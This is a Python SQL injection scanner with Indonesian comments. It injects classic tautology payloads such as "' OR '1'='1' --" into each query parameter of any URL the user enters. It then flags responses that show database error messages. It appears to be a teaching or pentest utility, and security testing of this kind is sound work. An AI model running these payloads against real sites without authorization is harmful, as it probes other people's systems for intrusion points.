import requests  # Mengimpor modul 'requests' untuk mengirim permintaan HTTP
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse  # Mengimpor fungsi untuk mem-parsing URL dan mengencode query parameter

# Payload injeksi SQL umum untuk diuji
payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\" --", "\" OR \"1\"=\"1\" /*"]
# Mendefinisikan daftar payload umum yang digunakan untuk menguji injeksi SQL

def sql_vulnerability(url):  # Mendefinisikan fungsi untuk memindai kerentanan SQL pada URL tertentu
    # Parse URL dan dapatkan parameter kueri
    parsed_url = urlparse(url)  # Mem-parse URL yang diberikan untuk mendapatkan komponennya
    query_params = parse_qs(parsed_url.query)  # Mengambil parameter query dari URL dan menyimpannya sebagai dictionary

    # Siapkan daftar untuk menyimpan query yang rentan
    vulnerable_queries = []  # Mempersiapkan daftar kosong untuk menyimpan URL yang terdeteksi rentan

    # Uji setiap parameter dengan setiap payload
    for param in query_params:  # Iterasi melalui setiap parameter di query
        for payload in payloads:  # Iterasi melalui setiap payload di daftar payloads
        
            # Buat query yang dimodifikasi dengan payload
            modified_params = query_params.copy()  # Menyalin parameter query untuk dimodifikasi
            modified_params[param] = payload  # Mengganti nilai parameter dengan payload untuk menguji kerentanannya
            modified_query = urlencode(modified_params, doseq=True)  # Mengencode parameter query yang sudah dimodifikasi menjadi format URL

            # Buat URL yang dimodifikasi
            modified_url = urlunparse(parsed_url._replace(query=modified_query))  
            # Membangun URL baru dengan parameter query yang telah dimodifikasi

            try:
                # Kirim permintaan ke URL yang dimodifikasi
                response = requests.get(modified_url, timeout=5)  
                # Mengirim permintaan HTTP GET ke URL yang telah dimodifikasi dengan batas waktu 5 detik
                
                # Periksa tanda-tanda umum kesalahan SQL dalam respons
                if ("sql syntax" in response.text.lower() or  # Memeriksa tanda-tanda umum kesalahan SQL di respons
                    "mysql" in response.text.lower() or
                    "syntax error" in response.text.lower() or
                    "unclosed quotation" in response.text.lower()):
                    print(f"Potential SQL Injection found with payload '{payload}' on parameter '{param}'")
                    # Mencetak pesan jika ada potensi injeksi SQL yang ditemukan
                    print(f"Vulnerable URL: {modified_url}")
                    # Mencetak URL yang rentan
                    vulnerable_queries.append(modified_url)
                    # Menambahkan URL rentan ke daftar

            except requests.RequestException as e:  # Menangani pengecualian jika permintaan gagal
                print(f"Request failed for URL {modified_url}: {e}")
                # Mencetak pesan kesalahan jika permintaan gagal

    if not vulnerable_queries:  # Memeriksa apakah ada URL yang rentan ditemukan
        print("No SQL vulnerabilities found.")  # Jika tidak ada, mencetak pesan bahwa tidak ada kerentanan SQL yang ditemukan
    else:
        print("\nVulnerable Queries:\n")  
        for query in vulnerable_queries:
        	print(f"[{query}]")
        # Jika ada, mencetak daftar URL yang rentan

# Input URL
url = input("Enter the URL to scan: ")  # Meminta pengguna untuk memasukkan URL yang akan dipindai
print("")
sql_vulnerability(url)  # Memanggil fungsi sql_vulnerability dengan URL yang diberikan oleh pengguna

